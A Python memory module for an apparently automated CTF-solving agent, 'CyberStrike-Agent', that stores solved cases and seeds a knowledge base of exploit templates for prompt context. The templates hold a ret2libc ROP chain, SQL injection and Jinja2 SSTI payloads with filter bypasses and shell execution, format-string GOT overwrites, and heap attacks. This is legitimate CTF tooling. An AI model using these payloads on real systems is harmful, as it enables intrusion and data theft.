"""
CyberStrike-Agent Memory Module
RAG 记忆系统 - 存储和检索成功案例
"""

import os
import json
import hashlib
import re
from typing import Optional, Dict, Any, List, Tuple
from dataclasses import dataclass, field, asdict
from pathlib import Path
from datetime import datetime
import threading

try:
    import chromadb
    from chromadb.config import Settings as ChromaSettings
    CHROMADB_AVAILABLE = True
except ImportError:
    CHROMADB_AVAILABLE = False

try:
    import numpy as np
    NUMPY_AVAILABLE = True
except ImportError:
    NUMPY_AVAILABLE = False


@dataclass
class CaseRecord:
    id: str
    task_description: str
    category: str
    flag: str
    key_payload: str
    thought_chain: List[str]
    actions: List[Dict[str, str]]
    success_time: str
    iterations: int
    keywords: List[str] = field(default_factory=list)
    embedding: Optional[List[float]] = None

    def to_dict(self) -> Dict:
        return asdict(self)

    @classmethod
    def from_dict(cls, data: Dict) -> 'CaseRecord':
        return cls(**data)


@dataclass
class KnowledgeTemplate:
    id: str
    name: str
    category: str
    description: str
    template: str
    keywords: List[str]
    example_usage: str

    def to_dict(self) -> Dict:
        return asdict(self)


class SimpleEmbedding:

    def __init__(self, dim: int = 128):
        self.dim = dim
        self.vocab: Dict[str, int] = {}
        self.idf: Dict[str, float] = {}
        self.doc_count = 0

    def _tokenize(self, text: str) -> List[str]:
        text = text.lower()
        tokens = re.findall(r'\b[a-z0-9_]+\b', text)
        return tokens

    def _hash_token(self, token: str) -> int:
        return int(hashlib.md5(token.encode()).hexdigest(), 16) % self.dim

    def encode(self, text: str) -> List[float]:
        tokens = self._tokenize(text)
        if not tokens:
            return [0.0] * self.dim
        vec = [0.0] * self.dim
        token_counts: Dict[int, int] = {}
        for token in tokens:
            idx = self._hash_token(token)
            token_counts[idx] = token_counts.get(idx, 0) + 1
        for idx, count in token_counts.items():
            vec[idx] = count / len(tokens)
        if NUMPY_AVAILABLE:
            norm = np.linalg.norm(vec)
            if norm > 0:
                vec = [v / norm for v in vec]
        return vec

    def similarity(self, vec1: List[float], vec2: List[float]) -> float:
        if not vec1 or not vec2:
            return 0.0
        if NUMPY_AVAILABLE:
            v1, v2 = np.array(vec1), np.array(vec2)
            norm1, norm2 = np.linalg.norm(v1), np.linalg.norm(v2)
            if norm1 == 0 or norm2 == 0:
                return 0.0
            return float(np.dot(v1, v2) / (norm1 * norm2))
        else:
            dot = sum(a * b for a, b in zip(vec1, vec2))
            norm1 = sum(a * a for a in vec1) ** 0.5
            norm2 = sum(b * b for b in vec2) ** 0.5
            if norm1 == 0 or norm2 == 0:
                return 0.0
            return dot / (norm1 * norm2)


class MemoryStore:

    def __init__(self, storage_path: str = "./memory"):
        self.storage_path = Path(storage_path)
        self.storage_path.mkdir(parents=True, exist_ok=True)

        self.cases: List[CaseRecord] = []
        self.knowledge: List[KnowledgeTemplate] = []
        self.embedding = SimpleEmbedding()
        self._lock = threading.Lock()

        self._chroma_client = None
        self._chroma_collection = None

        if CHROMADB_AVAILABLE:
            self._init_chroma()

        self._load_from_disk()
        self._init_knowledge_base()

    def _init_chroma(self):
        try:
            self._chroma_client = chromadb.PersistentClient(
                path=str(self.storage_path / "chroma"),
                settings=ChromaSettings(anonymized_telemetry=False)
            )
            self._chroma_collection = self._chroma_client.get_or_create_collection(
                name="ctf_cases",
                metadata={"description": "CTF successful cases"}
            )
        except Exception as e:
            print(f"[Memory] ChromaDB 初始化失败，使用 JSON 存储: {e}")
            self._chroma_client = None
            self._chroma_collection = None

    def _load_from_disk(self):
        cases_file = self.storage_path / "cases.json"
        if cases_file.exists():
            try:
                with open(cases_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.cases = [CaseRecord.from_dict(c) for c in data.get("cases", [])]
                print(f"[Memory] 已加载 {len(self.cases)} 条案例记录")
            except Exception as e:
                print(f"[Memory] 加载案例失败: {e}")

        knowledge_file = self.storage_path / "knowledge.json"
        if knowledge_file.exists():
            try:
                with open(knowledge_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.knowledge = [KnowledgeTemplate(**k) for k in data.get("knowledge", [])]
                print(f"[Memory] 已加载 {len(self.knowledge)} 条知识模板")
            except Exception as e:
                print(f"[Memory] 加载知识失败: {e}")

    def _save_to_disk(self):
        with self._lock:
            cases_file = self.storage_path / "cases.json"
            try:
                data = {
                    "cases": [c.to_dict() for c in self.cases],
                    "updated_at": datetime.now().isoformat()
                }
                with open(cases_file, 'w', encoding='utf-8') as f:
                    json.dump(data, f, ensure_ascii=False, indent=2)
            except Exception as e:
                print(f"[Memory] 保存案例失败: {e}")

    def _init_knowledge_base(self):
        if self.knowledge:
            return

        TPL_RET2LIBC = (
            "# ret2libc 利用模板\n"
            "# 1. 确定 libc 基址（通过泄露函数地址）\n"
            "# 2. 计算 system() 和 '/bin/sh' 地址\n"
            "# 3. 构造 ROP 链\n\n"
            "from pwn import *\n\n"
            "# 泄露 libc 地址\n"
            "payload = b'A' * offset\n"
            "payload += p64(pop_rdi)      # pop rdi; ret\n"
            "payload += p64(puts_got)     # 泄露 puts@got\n"
            "payload += p64(puts_plt)     # 调用 puts\n"
            "payload += p64(main_addr)    # 返回 main 再次利用\n\n"
            "# 计算 libc 基址\n"
            "libc_base = leaked_puts - libc.symbols['puts']\n"
            "system_addr = libc_base + libc.symbols['system']\n"
            "binsh_addr = libc_base + next(libc.search(b'/bin/sh'))\n\n"
            "# 最终 payload\n"
            "payload = b'A' * offset\n"
            "payload += p64(ret_gadget)   # 栈对齐\n"
            "payload += p64(pop_rdi)\n"
            "payload += p64(binsh_addr)\n"
            "payload += p64(system_addr)\n"
        )

        TPL_SQLI = (
            "# SQL 注入常见 Payload\n\n"
            "# 1. 判断注入点\n"
            "' OR '1'='1\n' OR '1'='1'--\n' OR '1'='1'#\n"
            "1' AND '1'='1\n1' AND '1'='2\n\n"
            "# 2. 联合查询\n"
            "' UNION SELECT 1,2,3--\n' UNION SELECT null,null,null--\n"
            "' UNION SELECT username,password,null FROM users--\n\n"
            "# 3. 盲注\n"
            "' AND SUBSTRING(database(),1,1)='a'--\n"
            "' AND ASCII(SUBSTRING(database(),1,1))>97--\n"
            "' AND (SELECT COUNT(*) FROM users)>0--\n\n"
            "# 4. 报错注入\n"
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--\n"
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--\n\n"
            "# 5. 绕过技巧\n"
            "'/**/OR/**/1=1--     # 空格绕过\n"
            "'%0aOR%0a1=1--       # 换行绕过\n"
            "'/*!50000OR*/1=1--   # 内联注释绕过\n"
            "' UnIoN SeLeCt 1--    # 大小写绕过\n"
        )

        TPL_FMTSTR = (
            "# 格式化字符串漏洞利用\n\n"
            "from pwn import *\n\n"
            "# 1. 确定偏移\n"
            "payload = b'AAAA.%p.%p.%p.%p.%p.%p.%p.%p'\n"
            "# 观察输出，找到 0x41414141 的位置\n\n"
            "# 2. 泄露栈上数据\n"
            "payload = b'%7$p'  # 泄露第 7 个参数\n\n"
            "# 3. 泄露任意地址\n"
            "payload = b'%7$s' + p64(target_addr)\n\n"
            "# 4. 写入任意地址（pwntools 自动化）\n"
            "payload = fmtstr_payload(offset, {target_addr: value})\n\n"
            "# 5. 覆盖 GOT 表\n"
            "payload = fmtstr_payload(offset, {printf_got: system_addr})\n\n"
            "# 6. 覆盖返回地址\n"
            "payload = fmtstr_payload(offset, {ret_addr: one_gadget})\n"
        )

        TPL_XOR = (
            "# XOR 解密脚本\n\n"
            "def xor_decrypt(data, key):\n"
            '    """单字节或多字节 XOR 解密"""\n'
            "    if isinstance(key, int):\n"
            "        key = bytes([key])\n"
            "    result = []\n"
            "    for i, b in enumerate(data):\n"
            "        result.append(b ^ key[i % len(key)])\n"
            "    return bytes(result)\n\n"
            "# 常见 XOR 密钥猜测\n"
            "def guess_xor_key(ciphertext):\n"
            '    """通过频率分析猜测密钥"""\n'
            "    for key in range(256):\n"
            "        decrypted = xor_decrypt(ciphertext, key)\n"
            "        if b'flag' in decrypted.lower() or b'ctf' in decrypted.lower():\n"
            "            return key, decrypted\n"
            "    return None, None\n\n"
            "# 已知明文攻击\n"
            "def known_plaintext_attack(ciphertext, known_plaintext):\n"
            '    """已知明文恢复密钥"""\n'
            "    key = []\n"
            "    for i, c in enumerate(known_plaintext):\n"
            "        key.append(ciphertext[i] ^ ord(c))\n"
            "    return bytes(key)\n"
        )

        TPL_RSA = (
            "# RSA 攻击脚本\n\n"
            "from Crypto.Util.number import *\n"
            "import gmpy2\n\n"
            "# 1. 小指数攻击 (e=3)\n"
            "def small_e_attack(c, e=3):\n"
            '    """当 m^e < n 时直接开方"""\n'
            "    m = gmpy2.iroot(c, e)[0]\n"
            "    return int(m)\n\n"
            "# 2. 共模攻击\n"
            "def common_modulus_attack(n, e1, e2, c1, c2):\n"
            '    """同一消息用不同指数加密"""\n'
            "    from gmpy2 import gcdext\n"
            "    g, s1, s2 = gcdext(e1, e2)\n"
            "    if s1 < 0:\n"
            "        c1 = gmpy2.invert(c1, n)\n"
            "        s1 = -s1\n"
            "    if s2 < 0:\n"
            "        c2 = gmpy2.invert(c2, n)\n"
            "        s2 = -s2\n"
            "    m = (pow(c1, s1, n) * pow(c2, s2, n)) % n\n"
            "    return int(m)\n\n"
            "# 3. Wiener 攻击 (d 小)\n"
            "def wiener_attack(n, e):\n"
            '    """当 d < n^0.25 时可恢复私钥"""\n'
            "    from fractions import Fraction\n"
            "    cf = continued_fraction(e, n)\n"
            "    convergents = cf.convergents()\n"
            "    for conv in convergents:\n"
            "        k, d = conv.numerator, conv.denominator\n"
            "        if k == 0:\n"
            "            continue\n"
            "        phi = (e * d - 1) // k\n"
            "        b = n - phi + 1\n"
            "        delta = b * b - 4 * n\n"
            "        if delta >= 0:\n"
            "            sqrt_delta = gmpy2.isqrt(delta)\n"
            "            if sqrt_delta * sqrt_delta == delta:\n"
            "                return d\n"
            "    return None\n\n"
            "# 4. 分解 n (factordb)\n"
            "# 访问 factordb.com 或使用 yafu\n"
        )

        TPL_SSTI = (
            "# Flask Jinja2 SSTI Payload\n\n"
            "# 1. 检测\n"
            "{{7*7}}  # 返回 49 则存在漏洞\n\n"
            "# 2. 获取配置\n"
            "{{config}}\n{{self.__init__.__globals__}}\n\n"
            "# 3. 获取类\n"
            "{{''.__class__.__mro__[1].__subclasses__()}}\n\n"
            "# 4. RCE (找 subprocess.Popen 或 os._wrap_close)\n"
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/bin/sh',shell=True,stdout=-1).communicate()}}\n\n"
            "# 5. 读取文件\n"
            "{{''.__class__.__mro__[2].__subclasses__()[40]('cat /flag',shell=True,stdout=-1).communicate()[0]}}\n\n"
            "# 6. 绕过过滤\n"
            "{{''['__cla''ss__']['__mr''o__']}}  # 拼接绕过\n"
            "{{request|attr('application')|attr('__globals__')}}  # attr 绕过\n"
            "{{lipsum.__globals__['os'].popen('id').read()}}  # lipsum 绕过\n"
        )

        TPL_HEAP = (
            "# 堆利用技术\n\n"
            "from pwn import *\n\n"
            "# 1. UAF (Use After Free)\n"
            "add(0x20, b'AAAA')    # chunk 0\n"
            "free(0)               # 释放\n"
            "# chunk 0 的指针未清空，仍可读写\n\n"
            "# 2. Double Free\n"
            "free(0)\n"
            "free(0)  # 或 free(1) 如果 0 和 1 指向同一地址\n\n"
            "# 3. Fastbin Attack\n"
            "target = 0x601000     # 目标地址附近\n"
            "add(0x68, b'A'*0x68)  # fastbin 范围\n"
            "free(0)\n"
            "edit(0, p64(target))  # 覆盖 fd\n"
            "add(0x68, b'B'*0x68)  # 分配原 chunk\n"
            "add(0x68, b'C'*0x68)  # 分配到 target 附近\n\n"
            "# 4. Unlink\n"
            "# 利用 unlink 宏修改指针\n\n"
            "# 5. House of Force\n"
            "# 覆盖 top chunk size 为 -1\n\n"
            "# 6. Tcache Attack (glibc 2.26+)\n"
            "# tcache 没有检查，更容易利用\n"
        )

        default_knowledge = [
            KnowledgeTemplate(
                id="ret2libc_basic",
                name="ret2libc 基础利用",
                category="pwn",
                description="当 NX 保护开启时，无法直接执行栈上的 shellcode。可以通过 ret2libc 技术调用系统中的 libc 函数",
                template=TPL_RET2LIBC,
                keywords=["ret2libc", "pwn", "rop", "nx", "libc", "system", "缓冲区溢出"],
                example_usage="适用于 NX 开启、有泄露点、已知 libc 版本的栈溢出题目"
            ),
            KnowledgeTemplate(
                id="sql_injection_basic",
                name="SQL 注入基础",
                category="web",
                description="通过构造恶意 SQL 语句绕过认证或提取数据",
                template=TPL_SQLI,
                keywords=["sql", "注入", "injection", "union", "盲注", "web"],
                example_usage="适用于登录绕过、数据提取、盲注等场景"
            ),
            KnowledgeTemplate(
                id="format_string",
                name="格式化字符串漏洞",
                category="pwn",
                description="printf 等函数格式化字符串漏洞利用",
                template=TPL_FMTSTR,
                keywords=["格式化字符串", "format string", "fsb", "pwn", "printf"],
                example_usage="适用于 printf(user_input) 类型的漏洞"
            ),
            KnowledgeTemplate(
                id="xor_cipher",
                name="XOR 解密",
                category="crypto",
                description="XOR 异或加密/解密",
                template=TPL_XOR,
                keywords=["xor", "异或", "crypto", "加密", "解密"],
                example_usage="适用于简单 XOR 加密的逆向或密码题"
            ),
            KnowledgeTemplate(
                id="rsa_attacks",
                name="RSA 常见攻击",
                category="crypto",
                description="RSA 加密常见攻击方法",
                template=TPL_RSA,
                keywords=["rsa", "crypto", "公钥", "私钥", "wiener", "共模"],
                example_usage="适用于 RSA 参数配置不当的密码题"
            ),
            KnowledgeTemplate(
                id="ssti_flask",
                name="SSTI 模板注入",
                category="web",
                description="服务端模板注入漏洞利用",
                template=TPL_SSTI,
                keywords=["ssti", "模板注入", "flask", "jinja2", "web", "rce"],
                example_usage="适用于 Flask/Jinja2 模板注入"
            ),
            KnowledgeTemplate(
                id="heap_overflow",
                name="堆利用基础",
                category="pwn",
                description="堆溢出常见利用方法",
                template=TPL_HEAP,
                keywords=["heap", "堆", "uaf", "fastbin", "tcache", "pwn"],
                example_usage="适用于堆溢出、UAF 等堆相关漏洞"
            ),
        ]

        self.knowledge = default_knowledge
        self._save_knowledge()

    def _save_knowledge(self):
        knowledge_file = self.storage_path / "knowledge.json"
        try:
            data = {
                "knowledge": [k.to_dict() for k in self.knowledge],
                "updated_at": datetime.now().isoformat()
            }
            with open(knowledge_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"[Memory] 保存知识失败: {e}")

    def add_case(self, case: CaseRecord):
        with self._lock:
            case.embedding = self.embedding.encode(case.task_description)
            self.cases.append(case)

            if self._chroma_collection:
                try:
                    self._chroma_collection.add(
                        ids=[case.id],
                        documents=[case.task_description],
                        metadatas=[{"category": case.category, "flag": case.flag}]
                    )
                except Exception as e:
                    print(f"[Memory] ChromaDB 添加失败: {e}")

            self._save_to_disk()
            print(f"[Memory] 已保存案例: {case.id}")

    def search_similar(self, query: str, top_k: int = 3) -> List[Tuple[CaseRecord, float]]:
        if not self.cases:
            return []

        query_embedding = self.embedding.encode(query)

        if self._chroma_collection:
            try:
                results = self._chroma_collection.query(
                    query_texts=[query],
                    n_results=top_k
                )
                if results['ids']:
                    matched_ids = results['ids'][0]
                    return [(c, 1.0) for c in self.cases if c.id in matched_ids]
            except Exception:
                pass

        similarities = []
        for case in self.cases:
            if case.embedding:
                sim = self.embedding.similarity(query_embedding, case.embedding)
                similarities.append((case, sim))

        similarities.sort(key=lambda x: x[1], reverse=True)
        return similarities[:top_k]

    def search_knowledge(self, query: str, top_k: int = 3) -> List[KnowledgeTemplate]:
        query_lower = query.lower()
        query_tokens = set(re.findall(r'\b[a-z0-9_]+\b', query_lower))

        scored = []
        for k in self.knowledge:
            k_tokens = set(t.lower() for t in k.keywords)
            score = len(query_tokens & k_tokens)
            if any(kw in query_lower for kw in k.keywords):
                score += 2
            if k.category.lower() in query_lower:
                score += 3
            scored.append((k, score))

        scored.sort(key=lambda x: x[1], reverse=True)
        return [k for k, s in scored[:top_k] if s > 0]

    def get_context_for_task(self, task_description: str) -> str:
        parts = []

        similar_cases = self.search_similar(task_description, top_k=2)
        if similar_cases:
            parts.append("## 相似成功案例参考")
            for i, (case, score) in enumerate(similar_cases, 1):
                parts.append(f"\n### 案例 {i} (相似度: {score:.2f})")
                parts.append(f"**题目**: {case.task_description[:200]}...")
                parts.append(f"**关键 Payload**:")
                parts.append(f"```\n{case.key_payload[:500]}\n```")
                if case.thought_chain:
                    parts.append(f"**解题思路**: {' -> '.join(case.thought_chain[:3])}")

        relevant_knowledge = self.search_knowledge(task_description, top_k=2)
        if relevant_knowledge:
            parts.append("\n## 相关知识模板")
            for k in relevant_knowledge:
                parts.append(f"\n### {k.name}")
                parts.append(f"**描述**: {k.description}")
                parts.append(f"**适用场景**: {k.example_usage}")
                parts.append(f"**参考代码**:")
                parts.append(f"```\n{k.template[:800]}\n```")

        return "\n".join(parts) if parts else ""

    def get_stats(self) -> Dict:
        return {
            "cases_count": len(self.cases),
            "knowledge_count": len(self.knowledge),
            "categories": list(set(c.category for c in self.cases)) if self.cases else [],
            "storage_backend": "chromadb" if self._chroma_client else "json"
        }

    def clear_cases(self):
        with self._lock:
            self.cases = []
            if self._chroma_collection:
                try:
                    self._chroma_client.delete_collection("ctf_cases")
                    self._chroma_collection = self._chroma_client.get_or_create_collection(
                        name="ctf_cases"
                    )
                except Exception:
                    pass
            self._save_to_disk()


memory_store: Optional[MemoryStore] = None


def get_memory() -> MemoryStore:
    global memory_store
    if memory_store is None:
        memory_store = MemoryStore()
    return memory_store
